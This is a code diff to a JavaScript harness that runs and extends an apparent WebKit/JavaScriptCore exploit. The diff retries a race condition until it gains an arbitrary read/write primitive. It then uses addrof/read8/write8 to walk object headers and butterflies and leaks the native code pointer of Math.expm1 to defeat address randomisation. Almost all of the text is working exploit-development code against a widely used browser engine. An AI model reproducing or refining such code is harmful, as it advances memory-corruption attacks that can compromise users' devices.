@@ -10,8 +10,8 @@ let busy = false;
 let ready = false;
 let exploit = null;
 
-const LOG_MAX = 120;
-const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SSV-|READ-PRIMITIVE|COMPOSITION|PRIMITIVE-OK|PAIR-STATUS/i;
+const LOG_MAX = 200;
+const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SSV-|READ-PRIMITIVE|COMPOSITION|PRIMITIVE-OK|PAIR-STATUS|AUTO-RETRY|ROUND|MISS/i;
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
 let btnStart, btnRefresh, btnPeek, btnClear;
@@ -66,41 +66,62 @@ function same64(a, b) {
 
 function addPtr(label, addr, note) {
     if (!addr) return;
-    pointers.push({ label, addr: String(addr), note: note || "" });
+    const row = { label, addr: String(addr), note: note || "" };
+    pointers.push(row);
+    mark("ADDR", row.label + "  " + row.addr + (row.note ? "  (" + row.note + ")" : ""));
 }
 
-function bufAddr(p, off, ab) {
-    const cell = p.leakval(ab);
-    addPtr("ArrayBuffer JSObject", cell, "leakval(ab)");
-    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
-    if (!impl) return null;
-    addPtr("ArrayBuffer impl", impl, "+0x" + off.wk_ArrayBuffer_m_impl.toString(16));
-    const data = read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
-    if (data) addPtr("ArrayBuffer backing", data, "m_contents.m_data");
-    return data;
+function walkCell(p, label, obj) {
+    retained.push(obj);
+    const cell = p.leakval(obj);
+    addPtr(label + " cell", cell, "leakval");
+    const hdr = read8p(p, cell);
+    if (hdr) mark("HDR", label + " header=" + hdr);
+    for (const [off, tag] of [[0x8, "butterfly"], [0x10, "+0x10"], [0x18, "+0x18"]]) {
+        const q = read8p(p, cell.add32(off));
+        if (q && q.low !== 0) addPtr(label + " " + tag, q, "cell+0x" + off.toString(16));
+    }
+    return cell;
 }
 
 function captureNativeChain(p, mFunctionOff) {
-    const cell = p.leakval(Math.expm1);
-    addPtr("Math.expm1 cell", cell, "leakval builtin");
+    const cell = walkCell(p, "Math.expm1", Math.expm1);
     const mid = read8p(p, cell.add32(0x18));
     if (!mid) return null;
     addPtr("JSFunction (expm1)", mid, "cell+0x18");
+    for (const off of [0x0, 0x8, 0x10, 0x20, 0x28, 0x30, 0x38]) {
+        if (off === mFunctionOff) continue;
+        const q = read8p(p, mid.add32(off));
+        if (q && q.hi > 0) addPtr("JSFunction+0x" + off.toString(16), q, "qword");
+    }
     const nativeFn = read8p(p, mid.add32(mFunctionOff));
     if (nativeFn) {
-        addPtr("native code ptr", nativeFn, "m_function — webkit text");
+        addPtr("native code ptr", nativeFn, "m_function / webkit .text");
         try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
+        const q0 = read4p(p, nativeFn);
+        if (q0 != null) mark("CODE", "nativeFn first4=0x" + (q0 >>> 0).toString(16));
     }
     return nativeFn;
 }
 
 function addPairStatusPtrs() {
     const ps = pairStatus;
-    if (ps.mainAddress) addPtr("carrier mainView", ps.mainAddress, "pair");
-    if (ps.workerAddress) addPtr("carrier workerView", ps.workerAddress, "pair");
-    if (ps.fakeAddress) addPtr("fake cell", ps.fakeAddress, "exploit");
-    if (ps.fakeButterfly) addPtr("fake butterfly", ps.fakeButterfly, "exploit");
-    if (ps.mainCellFromFakeSlot) addPtr("main from fake slot", ps.mainCellFromFakeSlot, "pair");
+    const fields = [
+        ["mainAddress", "carrier mainView"],
+        ["mainVector", "main vector"],
+        ["mainCellFromFakeSlot", "main from fake slot"],
+        ["workerAddress", "carrier workerView"],
+        ["workerVector", "worker vector"],
+        ["workerButterfly", "worker butterfly"],
+        ["fakeAddress", "fake cell"],
+        ["fakeButterfly", "fake butterfly"],
+    ];
+    for (const [key, label] of fields) {
+        const v = ps[key];
+        if (v != null && v !== -1) addPtr(label, v, "pair/exploit");
+    }
+    mark("PAIR", "state=" + ps.state + " promoted=" + ps.promoted
+        + " vectorOff=0x" + (ps.vectorOffset >>> 0).toString(16));
 }
 
 function renderMap() {
@@ -178,27 +199,64 @@ async function loadExploit() {
     return exploit;
 }
 
-function maxAttempts() {
-    const n = parseInt(params.get("attempts") || "6", 10);
-    return n > 0 ? n : 6;
+function attemptCap() {
+    if (!params.has("attempts")) return 0;
+    const n = parseInt(params.get("attempts"), 10);
+    return n > 0 ? n : 0;
+}
+
+async function establishUntilOk(establishPrimitive) {
+    const cap = attemptCap();
+    let round = 0;
+    for (;;) {
+        round++;
+        if (round > 1) mark("ROUND", String(round));
+        state(cap === 0
+            ? "race attempt " + round + " (until success)…"
+            : "race round " + round + "…", "warn");
+        try {
+            return await establishPrimitive({
+                maxAttempts: cap,
+                onEvent: (t, d, a) => (CORE_LOG.test(t) ? mark : () => {})
+                    (t, (a != null ? "[" + a + "] " : "") + (d || ""))
+            });
+        } catch (err) {
+            mark("MISS", String(err.message || err));
+            if (cap > 0 && round >= 3) throw err;
+            await new Promise(r => setTimeout(r, 900));
+        }
+    }
+}
+
+function bufAddr(p, off, ab) {
+    const cell = walkCell(p, "ArrayBuffer", ab);
+    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
+    if (!impl) return null;
+    addPtr("ArrayBuffer impl", impl, "+0x" + off.wk_ArrayBuffer_m_impl.toString(16));
+    const data = read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
+    if (data) addPtr("ArrayBuffer backing", data, "m_contents.m_data");
+    return data;
 }
 
 async function runRwProof(p, off) {
     const boxA = { tag: "demoA", n: 1 };
     const boxB = { tag: "demoB", n: 2 };
-    retained.push(boxA, boxB);
+    walkCell(p, "JSObject A", boxA);
+    walkCell(p, "JSObject B", boxB);
 
-    const addrA = p.leakval(boxA);
-    const addrB = p.leakval(boxB);
-    addPtr("JSObject A", addrA, "leakval demo object");
-    addPtr("JSObject B", addrB, "leakval demo object");
+    const rowA = pointers.filter(x => x.label === "JSObject A cell").pop();
+    const rowB = pointers.filter(x => x.label === "JSObject B cell").pop();
+    const addrA = rowA ? parseAddr(String(rowA.addr).replace(/^0x/i, "")) : null;
+    const addrB = rowB ? parseAddr(String(rowB.addr).replace(/^0x/i, "")) : null;
 
-    const okLeak = !same64(addrA, addrB) && addrA.low !== 0;
+    const okLeak = addrA && addrB && !same64(addrA, addrB) && addrA.low !== 0;
     mark(okLeak ? "PASS" : "FAIL", "leakval-distinct  a=" + addrA + " b=" + addrB);
 
-    const headerA = p.read8(addrA);
-    p.write8(addrA, headerA);
-    const okHdr = same64(p.read8(addrA), headerA);
+    const headerA = okLeak ? p.read8(addrA) : null;
+    if (headerA) {
+        p.write8(addrA, headerA);
+    }
+    const okHdr = headerA && same64(p.read8(addrA), headerA);
     mark(okHdr ? "PASS" : "FAIL", "read8-write8 header roundtrip");
 
     const probe = new ArrayBuffer(0x20);
@@ -223,8 +281,12 @@ async function runRwProof(p, off) {
         captureNativeChain(p, off.wk_JSFunction_m_function || 0x28);
     }
 
+    try { walkCell(p, "parseFloat", parseFloat); } catch (_) { }
+    try { walkCell(p, "Object proto", Object); } catch (_) { }
+
     addPairStatusPtrs();
     renderMap();
+    mark("ADDR-LIST", pointers.length + " pointers logged above");
 
     return okLeak && okHdr;
 }
@@ -244,11 +306,7 @@ async function runStart() {
 
     try {
         const { establishPrimitive, installWindowP: installP } = await loadExploit();
-        const carrier = await establishPrimitive({
-            maxAttempts: maxAttempts(),
-            onEvent: (t, d, a) => (CORE_LOG.test(t) ? mark : () => {})
-                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
-        });
+        const carrier = await establishUntilOk(establishPrimitive);
 
         installP(carrier, { promote: params.get("promote") === "1" });
         const p = window.p;
@@ -316,8 +374,9 @@ function init() {
     });
 
     if (params.has("g")) mark("BOOT", "groom=" + params.getAll("g").join(","));
+    mark("BOOT", "retries=until OK (add ?attempts=6 to cap per round)");
     setUi();
-    state("ready — one button: primitive + rw proof + pointer map", "");
+    state("ready — retries race until primitive wins", "");
 }
 
 init();
